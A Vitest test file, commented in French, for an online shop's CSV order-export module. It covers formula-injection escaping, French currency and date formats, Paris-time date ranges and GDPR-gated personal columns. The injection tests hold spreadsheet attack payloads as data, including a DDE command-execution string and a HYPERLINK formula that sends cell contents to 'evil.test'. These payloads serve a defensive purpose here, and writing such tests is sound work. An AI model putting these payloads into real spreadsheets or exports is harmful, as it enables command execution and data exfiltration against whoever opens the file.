// @vitest-environment node
import { describe, it, expect, vi } from "vitest";

vi.mock("@/lib/stripe", () => ({ stripe: () => ({}) }));
vi.mock("next/cache", () => ({ revalidateTag: vi.fn(), revalidatePath: vi.fn() }));
vi.mock("next/server", () => ({ after: (fn: () => unknown) => void fn() }));

import {
  MAX_EXPORT_DAYS,
  csvDateTime,
  csvEuros,
  csvText,
  exportFilename,
  exportHeaders,
  exportRows,
  orderAmounts,
  parisDay,
  parisMidnight,
  parseExportParams,
  toCsv,
} from "@/lib/orders-export";
import type { Order } from "@/lib/shop";

const order = (over: Partial<Order> = {}): Order => ({
  id: "0b6f1d3e-8f1a-4a7e-9c2d-5e4f3a2b1c0d",
  status: "paid",
  items: [
    { variant_id: "v1", product_id: "p1", slug: "maillot", name: "Maillot officiel XBZ", size: "M", quantity: 2, unit_amount: 4999, image: null },
    { variant_id: "v2", product_id: "p2", slug: "mug", name: "Mug XBZ", size: "", quantity: 1, unit_amount: 1499, image: null },
  ],
  subtotal: "114.97",
  shipping: "4.90",
  currency: "eur",
  locale: "fr",
  expires_at: null,
  stripe_session_id: "cs_1",
  stripe_payment_intent: "pi_123",
  amount_total: "119.87",
  customer_email: "alice@example.fr",
  customer_name: "Alice Martin",
  shipping_address: { line1: "12 rue des Lilas", line2: null, postal_code: "69003", city: "Lyon", state: null, country: "FR" },
  note: null,
  created_at: "2026-10-03T12:00:00.000Z",
  paid_at: "2026-10-03T12:05:00.000Z",
  fulfilled_at: null,
  cancelled_at: null,
  refunded_at: null,
  ...over,
});

/** Lecteur CSV minimal (séparateur « ; », guillemets doublés) : ce que fait Excel. */
function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = "";
  let quoted = false;
  const body = text.replace(/^﻿/, "");
  for (let i = 0; i < body.length; i++) {
    const c = body[i];
    if (quoted) {
      if (c === '"' && body[i + 1] === '"') {
        cell += '"';
        i++;
      } else if (c === '"') quoted = false;
      else cell += c;
    } else if (c === '"') quoted = true;
    else if (c === ";") {
      row.push(cell);
      cell = "";
    } else if (c === "\r" && body[i + 1] === "\n") {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = "";
      i++;
    } else cell += c;
  }
  return rows;
}

describe("csvText — injection de formules", () => {
  it.each(["=1+1", "+33612345678", "-2+3", "@SUM(A1:A9)", '=HYPERLINK("http://evil.test","clic")', "=cmd|' /C calc'!A0"])(
    "neutralise « %s » (lue comme une formule par Excel)",
    (value) => {
      const cell = csvText(value);
      expect(cell.startsWith(`"'`)).toBe(true);
      // Une fois le fichier relu, la cellule ne commence plus par un opérateur.
      expect(parseCsv(`${cell}\r\n`)[0][0]).toMatch(/^'[=+\-@]/);
    },
  );

  it.each(["\t=1+1", "\r=1+1", "  =1+1", "\n@x", "\u0000=1"])("neutralise aussi une formule précédée de contrôle ou d'espaces (%j)", (value) => {
    expect(parseCsv(`${csvText(value)}\r\n`)[0][0]).toBe(`'${value.replace(/[\u0000-\u001f]+/g, " ").trim()}`);
  });

  it("laisse intact un texte ordinaire, accents compris", () => {
    expect(csvText("Hélène d'Orléans")).toBe(`"Hélène d'Orléans"`);
    expect(csvText("2 × Maillot (M)")).toBe(`"2 × Maillot (M)"`);
    expect(csvText("a=b")).toBe(`"a=b"`); // seul le DÉBUT compte
  });

  it("double les guillemets, aplatit les retours à la ligne", () => {
    expect(csvText('Le "Grand" Maillot')).toBe(`"Le ""Grand"" Maillot"`);
    expect(csvText("12 rue A\nBâtiment B\r\nLyon")).toBe(`"12 rue A Bâtiment B Lyon"`);
  });

  it("valeur absente : cellule vide, pas « null »", () => {
    expect(csvText(null)).toBe('""');
    expect(csvText(undefined)).toBe('""');
  });

  it("un « ; » dans la saisie reste dans sa cellule", () => {
    expect(parseCsv(`${csvText("a;b")};${csvText("c")}\r\n`)[0]).toEqual(["a;b", "c"]);
  });
});

describe("formats français", () => {
  it("montants : virgule, deux décimales, jamais d'erreur d'arrondi flottant", () => {
    expect(csvEuros(49.9)).toBe("49,90");
    expect(csvEuros("114.97")).toBe("114,97");
    expect(csvEuros(0)).toBe("0,00");
    expect(csvEuros(0.1 + 0.2)).toBe("0,30");
    expect(csvEuros(1234.5)).toBe("1234,50"); // pas de séparateur de milliers
    expect(csvEuros(1.005)).toBe("1,01");
    expect(csvEuros(null)).toBe("");
    expect(csvEuros("abc")).toBe("");
  });

  it("dates : heure de Paris, été comme hiver", () => {
    expect(csvDateTime("2026-10-03T12:05:00Z")).toBe("03/10/2026 14:05");
    expect(csvDateTime("2026-01-15T12:05:00Z")).toBe("15/01/2026 13:05");
    expect(csvDateTime("2026-10-02T22:30:00Z")).toBe("03/10/2026 00:30"); // minuit passé à Paris
    expect(csvDateTime(null)).toBe("");
    expect(csvDateTime("pas une date")).toBe("");
  });
});

describe("période (heure de Paris)", () => {
  it("minuit à Paris, hiver et été", () => {
    expect(parisMidnight("2026-01-15").toISOString()).toBe("2026-01-14T23:00:00.000Z");
    expect(parisMidnight("2026-07-15").toISOString()).toBe("2026-07-14T22:00:00.000Z");
  });

  it("jours de changement d'heure", () => {
    expect(parisMidnight("2026-03-29").toISOString()).toBe("2026-03-28T23:00:00.000Z"); // avant le passage à l'heure d'été
    expect(parisMidnight("2026-03-30").toISOString()).toBe("2026-03-29T22:00:00.000Z");
    expect(parisMidnight("2026-10-25").toISOString()).toBe("2026-10-24T22:00:00.000Z"); // avant le retour à l'heure d'hiver
    expect(parisMidnight("2026-10-26").toISOString()).toBe("2026-10-25T23:00:00.000Z");
  });

  it("jour de Paris d'un instant (23 h UTC = lendemain à Paris)", () => {
    expect(parisDay(new Date("2026-10-02T22:30:00Z"))).toBe("2026-10-03");
    expect(parisDay(new Date("2026-10-02T21:30:00Z"))).toBe("2026-10-02");
  });

  const NOW = new Date("2026-10-03T12:00:00Z");
  const parse = (qs: string) => parseExportParams(new URLSearchParams(qs), NOW);

  it("sans dates : du 1er du mois à aujourd'hui", () => {
    const r = parse("");
    expect(r.ok && [r.params.fromDay, r.params.toDay, r.params.detail, r.params.personal]).toEqual(["2026-10-01", "2026-10-03", "commandes", false]);
  });

  it("le dernier jour est INCLUS : la fin est minuit du lendemain", () => {
    const r = parse("du=2026-09-01&au=2026-09-30");
    expect(r.ok && [r.params.from.toISOString(), r.params.to.toISOString()]).toEqual(["2026-08-31T22:00:00.000Z", "2026-09-30T22:00:00.000Z"]);
    const dst = parse("du=2026-10-25&au=2026-10-25");
    expect(dst.ok && dst.params.to.toISOString()).toBe("2026-10-25T23:00:00.000Z"); // journée de 25 h
  });

  it.each([
    ["du=2026-02-30&au=2026-03-01", /Dates invalides/],
    ["du=03/10/2026&au=2026-10-03", /Dates invalides/],
    ["du=2026-10-04&au=2026-10-03", /après la date de fin/],
    ["du=2025-01-01&au=2026-10-03", /Période trop longue/],
    ["detail=tout", /Détail inconnu/],
  ])("refuse « %s »", (qs, message) => {
    const r = parse(qs);
    expect(!r.ok && r.error).toMatch(message);
  });

  it(`accepte ${MAX_EXPORT_DAYS} jours, pas un de plus`, () => {
    expect(parse("du=2026-01-01&au=2027-01-01").ok).toBe(true); // 366 jours (2026 n'est pas bissextile : 365 + 1)
    expect(parse("du=2026-01-01&au=2027-01-02").ok).toBe(false);
  });

  it("données personnelles : seulement avec perso=1 (jamais par défaut, ni avec « true »)", () => {
    expect(parse("perso=1").ok && (parse("perso=1") as { params: { personal: boolean } }).params.personal).toBe(true);
    for (const v of ["", "0", "true", "on"]) {
      const r = parse(`perso=${v}`);
      expect(r.ok && r.params.personal).toBe(false);
    }
  });

  it("nom de fichier sûr, sans rien venir de l'utilisateur hors dates validées", () => {
    expect(exportFilename({ fromDay: "2026-09-01", toDay: "2026-09-30", detail: "commandes" })).toBe("xbz-commandes_2026-09-01_2026-09-30.csv");
  });
});

describe("montants d'une commande", () => {
  it("le montant encaissé fait foi ; à défaut, articles + port", () => {
    expect(orderAmounts(order()).total).toBeCloseTo(119.87);
    expect(orderAmounts(order({ amount_total: null })).total).toBeCloseTo(119.87);
  });

  it("remboursement : montant enregistré ; sinon « remboursée » = en totalité ; sinon rien", () => {
    expect(orderAmounts(order({ refunded_amount: "4.90" }))).toMatchObject({ refunded: 4.9, net: expect.closeTo(114.97) });
    expect(orderAmounts(order({ status: "refunded" }))).toMatchObject({ refunded: expect.closeTo(119.87), net: expect.closeTo(0) });
    expect(orderAmounts(order())).toMatchObject({ refunded: 0 });
    // Un partiel dont le montant n'est pas (encore) enregistré ne sort PAS comme un remboursement total.
    expect(orderAmounts(order({ status: "fulfilled", note: "Remboursement partiel : 4,90 €" })).refunded).toBe(0);
  });
});

describe("export par commande", () => {
  const headers = exportHeaders({ detail: "commandes", personal: false });

  it("une ligne par commande, autant de cellules que d'en-têtes", () => {
    const rows = exportRows([order(), order({ id: "1c6f1d3e-8f1a-4a7e-9c2d-5e4f3a2b1c0d", status: "fulfilled", fulfilled_at: "2026-10-04T09:00:00Z" })], { detail: "commandes", personal: false });
    expect(rows).toHaveLength(2);
    for (const r of rows) expect(r).toHaveLength(headers.length);
  });

  it("contenu d'une commande payée", () => {
    const csv = toCsv(headers, exportRows([order()], { detail: "commandes", personal: false }));
    const [head, line] = parseCsv(csv);
    const row = Object.fromEntries(head.map((h, i) => [h, line[i]]));
    expect(row).toMatchObject({
      "N° commande": "XBZ-0B6F1D3E",
      "Date de paiement": "03/10/2026 14:05",
      Statut: "Payée",
      Articles: "2 × Maillot officiel XBZ (M) ; 1 × Mug XBZ",
      "Quantité totale": "3",
      "Sous-total articles (€)": "114,97",
      "Frais de port (€)": "4,90",
      "Total encaissé (€)": "119,87",
      "Montant remboursé (€)": "0,00",
      "Net encaissé (€)": "119,87",
      Devise: "EUR",
      "Pays de livraison": "FR",
      "Réf. paiement Stripe": "pi_123",
    });
  });

  it("commande remboursée : date et montant sur sa ligne", () => {
    const [, line] = parseCsv(
      toCsv(headers, exportRows([order({ status: "refunded", refunded_at: "2026-10-20T08:00:00Z", refunded_amount: "119.87" })], { detail: "commandes", personal: false })),
    );
    const row = Object.fromEntries(headers.map((h, i) => [h, line[i]]));
    expect(row).toMatchObject({ Statut: "Remboursée", "Date de remboursement": "20/10/2026 10:00", "Montant remboursé (€)": "119,87", "Net encaissé (€)": "0,00" });
  });

  it("RGPD : sans perso=1, ni nom, ni e-mail, ni adresse dans le fichier", () => {
    const csv = toCsv(headers, exportRows([order()], { detail: "commandes", personal: false }));
    for (const secret of ["Alice", "Martin", "alice@example.fr", "rue des Lilas", "69003", "Lyon"]) expect(csv).not.toContain(secret);
    expect(headers).not.toContain("E-mail");
  });

  it("avec perso=1 : colonnes personnelles ajoutées, toujours alignées", () => {
    const h = exportHeaders({ detail: "commandes", personal: true });
    const rows = exportRows([order()], { detail: "commandes", personal: true });
    expect(h.slice(-7)).toEqual(["Nom", "E-mail", "Adresse", "Complément d'adresse", "Code postal", "Ville", "Région"]);
    expect(rows[0]).toHaveLength(h.length);
    const [, line] = parseCsv(toCsv(h, rows));
    expect(line.slice(-7)).toEqual(["Alice Martin", "alice@example.fr", "12 rue des Lilas", "", "69003", "Lyon", ""]);
  });

  it("saisie client malveillante : neutralisée dans CHAQUE colonne texte", () => {
    const evil = '=HYPERLINK("http://evil.test/?"&A1,"clic")';
    const o = order({
      customer_name: evil,
      customer_email: "+evil@example.fr",
      shipping_address: { line1: "@cmd", line2: "-1", postal_code: "=1", city: "\t=1", state: "=1", country: "=FR" },
      items: [{ variant_id: "v", product_id: "p", slug: "x", name: "=1+1", size: "=2", quantity: 1, unit_amount: 100, image: null }],
      stripe_payment_intent: "=pi",
    });
    const h = exportHeaders({ detail: "commandes", personal: true });
    const [, line] = parseCsv(toCsv(h, exportRows([o], { detail: "commandes", personal: true })));
    const textual = line.filter((c) => /^'?[=+\-@]/.test(c) || c.startsWith("'"));
    expect(textual.length).toBeGreaterThanOrEqual(9);
    // Aucune cellule du fichier, une fois relu, ne commence par un opérateur de formule.
    expect(line.filter((c) => /^[=+\-@]/.test(c))).toEqual([]);
  });

  it("aucune commande : l'en-tête seul, fichier valide", () => {
    const csv = toCsv(headers, exportRows([], { detail: "commandes", personal: false }));
    expect(parseCsv(csv)).toEqual([headers]);
  });
});

describe("export par article", () => {
  const detail = { detail: "articles", personal: true } as const;
  const headers = exportHeaders(detail);

  it("une ligne par article, plus une ligne de port : la somme retombe sur le total encaissé", () => {
    const [head, ...lines] = parseCsv(toCsv(headers, exportRows([order()], detail)));
    expect(lines).toHaveLength(3);
    const col = (name: string) => head.indexOf(name);
    expect(lines.map((l) => l[col("Type de ligne")])).toEqual(["Article", "Article", "Port"]);
    const sum = lines.reduce((s, l) => s + Number(l[col("Total ligne (€)")].replace(",", ".")), 0);
    expect(sum).toBeCloseTo(119.87, 2);
    expect(lines[0].slice(4, 9)).toEqual(["Maillot officiel XBZ", "M", "2", "49,99", "99,98"]);
  });

  it("ne contient JAMAIS de donnée personnelle, même avec perso=1", () => {
    const csv = toCsv(headers, exportRows([order()], detail));
    for (const secret of ["Alice", "alice@example.fr", "rue des Lilas", "69003"]) expect(csv).not.toContain(secret);
    expect(headers).toEqual(exportHeaders({ detail: "articles", personal: false }));
  });

  it("port offert : pas de ligne de port", () => {
    const lines = exportRows([order({ shipping: "0", subtotal: "119.87" })], detail);
    expect(lines.map((l) => l[3])).toEqual(['"Article"', '"Article"']);
  });
});

describe("export : articles personnalisés", () => {
  const printed = (over: Partial<Order> = {}) =>
    order({
      items: [
        { variant_id: "v1", product_id: "p1", slug: "maillot", name: "Maillot officiel XBZ", size: "M", quantity: 1, unit_amount: 4999, image: null },
        {
          variant_id: "v1",
          product_id: "p1",
          slug: "maillot",
          name: "Maillot officiel XBZ",
          size: "M",
          quantity: 1,
          unit_amount: 5499,
          image: null,
          print: { name: "MARTIN", number: "10", extra: 500 },
        },
      ],
      subtotal: "104.98",
      amount_total: "109.88",
      ...over,
    });

  it("par commande : le texte à imprimer figure dans la désignation, entre crochets", () => {
    const h = exportHeaders({ detail: "commandes", personal: false });
    const [, line] = parseCsv(toCsv(h, exportRows([printed()], { detail: "commandes", personal: false })));
    expect(line[h.indexOf("Articles")]).toBe("1 × Maillot officiel XBZ (M) ; 1 × Maillot officiel XBZ (M) [personnalisé : MARTIN · n° 10]");
  });

  it("par article : colonne « Personnalisation », vide pour l'article ordinaire et pour le port", () => {
    const detail = { detail: "articles", personal: false } as const;
    const h = exportHeaders(detail);
    expect(h[h.length - 1]).toBe("Personnalisation");
    const [, ...lines] = parseCsv(toCsv(h, exportRows([printed()], detail)));
    expect(lines.map((l) => l[h.indexOf("Personnalisation")])).toEqual(["", "personnalisé : MARTIN · n° 10", ""]);
    // Chaque ligne a autant de cellules que d'en-têtes (le port aussi).
    for (const l of lines) expect(l).toHaveLength(h.length);
    // Le prix de la ligne personnalisée est le prix PAYÉ : la somme retombe sur le total encaissé.
    const sum = lines.reduce((n, l) => n + Number(l[h.indexOf("Total ligne (€)")].replace(",", ".")), 0);
    expect(sum).toBeCloseTo(109.88, 2);
  });

  it("la cellule « Personnalisation » commence par « personnalisé » : jamais par le texte du client (aucune formule possible)", () => {
    const o = printed();
    o.items[1].print = { name: "=2+2", extra: 0 };
    const detail = { detail: "articles", personal: false } as const;
    const h = exportHeaders(detail);
    const cells = exportRows([o], detail).map((r) => r[h.indexOf("Personnalisation")]);
    for (const c of cells) expect(c).not.toMatch(/^"[=+\-@]/);
    // …et, si jamais une cellule commençait par le texte, csvText l'aurait neutralisée.
    expect(csvText("=2+2")).toBe(`"'=2+2"`);
  });
});

describe("fichier", () => {
  it("BOM UTF-8, séparateur « ; », fins de ligne CRLF, ligne finale terminée", () => {
    const csv = toCsv(["A", "B"], [['"x"', "1,50"]]);
    expect(csv.startsWith("﻿")).toBe(true);
    expect(csv).toBe("﻿A;B\r\n\"x\";1,50\r\n");
    expect(csv.replace(/\r\n/g, "")).not.toMatch(/[\r\n]/); // aucun saut de ligne isolé
  });

  it("encodé en UTF-8, les accents des noms de produits survivent", () => {
    const csv = toCsv(["Désignation"], [[csvText("Casquette « Élite »")]]);
    expect(new TextDecoder().decode(new TextEncoder().encode(csv))).toContain("Casquette « Élite »");
  });
});
